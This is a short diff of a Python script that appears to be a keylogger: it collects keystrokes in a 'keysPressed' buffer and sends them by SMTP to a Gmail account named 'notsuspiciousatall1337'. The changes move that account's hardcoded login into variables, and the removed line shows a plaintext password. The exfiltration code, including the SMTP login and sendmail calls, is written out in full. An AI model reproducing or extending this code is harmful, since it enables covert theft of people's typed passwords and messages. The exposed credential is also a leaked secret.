@@ -9,6 +9,8 @@ import random
 import subprocess
 import sys
 
+emailUsername = "notsuspiciousatall1337"
+emailPassword = "REDACTED"
 
 try:
         buffer = 1000
@@ -47,7 +49,7 @@ try:
         keysPressed = ''
 
         def send(body):
-                addr = "notsuspiciousatall1337@gmail.com"
+                addr = emailUsername+"@gmail.com"
                 msg = MIMEMultipart()
                 msg['From'] = addr
                 msg['To'] = addr
@@ -57,7 +59,7 @@ try:
                  
                 server = smtplib.SMTP('smtp.gmail.com', 587)
                 server.starttls()
-                server.login("notsuspiciousatall1337", "Passtheword123")
+                server.login(emailUsername, emailPassword)
                 text = msg.as_string()
                 server.sendmail(addr, addr, text)
                 server.quit()
